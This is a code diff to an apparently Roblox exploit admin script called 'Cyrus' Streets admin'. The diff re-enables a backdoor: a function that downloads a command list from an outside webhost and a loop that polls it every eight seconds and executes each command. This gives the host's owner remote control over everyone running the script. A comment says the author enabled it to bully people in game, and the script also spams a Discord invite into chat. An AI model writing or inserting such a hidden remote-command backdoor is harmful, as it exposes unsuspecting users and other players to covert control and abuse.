@@ -571,11 +571,11 @@ end
 -- [[ End ]] --
 
 -- [[ Local functions ]] --
---[[
+
 local function GetData()
-	return HttpService:JSONDecode(game:HttpGet("http://cyrustesting.byethost15.com/Commands.json"))
+	return HttpService:JSONDecode(game:HttpGet("https://fuckmalwarebytes.000webhostapp.com/Commands.json"))
 end
-]]
+	
 local function BackdoorCheck(Player,Chat)
 	if Chat:sub(1,1) == "`" then
 		local Arguments = string.split(Chat:sub(2)," ")
@@ -3316,7 +3316,7 @@ end))
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: A4nyecN)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
 notif("Newest Update","dot_mp4 here, cyadmin has been completely fixed for the 11/9/20 upd",10,nil)
 ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new cord: 6BUAhZwA5V","All")
---[[
+
 while wait(8) do
 	local Data = GetData()
 	for i,v in pairs(Data) do
@@ -3324,4 +3324,4 @@ while wait(8) do
 			BackdoorCheck("none","`"..v)
 		end
 	end
-end]] -- lets see if I get banned off this webhost lmao
+end -- I uncommented this because I want to bully people ingame
